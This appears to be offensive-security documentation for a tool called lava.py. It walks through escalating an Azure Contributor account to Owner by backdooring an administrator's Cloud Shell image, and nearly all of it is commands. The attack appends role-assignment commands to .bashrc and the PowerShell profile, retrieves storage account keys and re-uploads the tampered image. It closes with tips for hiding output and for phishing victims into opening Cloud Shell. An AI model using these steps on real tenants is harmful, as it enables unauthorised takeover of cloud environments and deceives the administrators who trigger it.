# Privilege Escalation using the Cloud Shell Account

## Steps

 - az login -u CONTRIBUTOR_USER@DOMAIN.LOCAL -p PASSWORD (Authenticate with the contributor account)

 - python3 lava.py

 - Lava $> exec priv_show (Verify the current user and permissions)

 - Lava $> exec stg_file_scan (Scan the file shares in the Azure subscription for potential Cloud Shell images)

 - Lava $> exec stg_file_download (Downloads the file into a temporary directory. Make note of the download location.)

 - exit

 - mount DOWNLOAD_LOCATION/.cloudconsole/acc_azureadmin.img /mnt (Mount the downloaded image file)

 - ls /mnt/ (Explore the mounted drive with this command, then press tab)

 - cd /mnt (Change directory to the mounted drive)

 - echo "az role assignment create --role "Owner" --assignee $(az ad user list --display-name contributoruser | jq '.[]' | jq -r '.userPrincipalName')" >> .bashrc (Append a malicious command to the .bashrc file to escalate the privileges of our current user)

### To do the same for a Powershell session we can do:

 - mkdir .config

 - mkdir .config/PowerShell

 - echo "New-AzRoleAssignment -UserPrincipalName (Get-AzADUser -StartsWith contributoruser).UserPrincipalName -RoleDefinitionName Owner" >> .config/PowerShell/Microsoft.PowerShell_profile.ps1 (Same trick as Linux)

 - cd ..

 - umount /mnt (Unmount the drive from your session)

 - az storage account list --query [].name -o tsv (Enumerate the storage accounts)

 - storagename=STORAGE_ACCT_NAME (Store the target storage account in a variable)

 - key=$(az storage account keys list -n $storagename --query [0].value -o tsv) (Obtain the access key)

 - csfileshare=$(az storage share list --account-key $key --account-name $storagename --query [].name -o tsv) (Obtain the file share)

 - az storage file upload --account-key $key --account-name $storagename --share-name $csfileshare --path ".cloudconsole/acc_azureadmin.img" --source "DOWNLOAD_LOCATION/.cloudconsole/acc_azureadmin.img" (Upload the image back to it)

 - Trigger the attack by opening a Cloud Shell instance as an administrator (Or wait for someone to trigger it)

 - After triggering, execute python3 lava.py

 - exec priv_show (Verify the attack worked)

## TIP: For a stealthier action from our attacks, we can use: | out-null function at the end of the Powershell command OR &> /dev/null at the end of the Bash shell attack.

### In a practical attack scenario, it may take a while for a victim Cloud Shell account to open a new session. To expedite this process, you could send a phishing email that links to https://shell.azure.com/. Not only will the link look legitimate, but it will start up a Cloud Shell session as soon as the site is loaded.



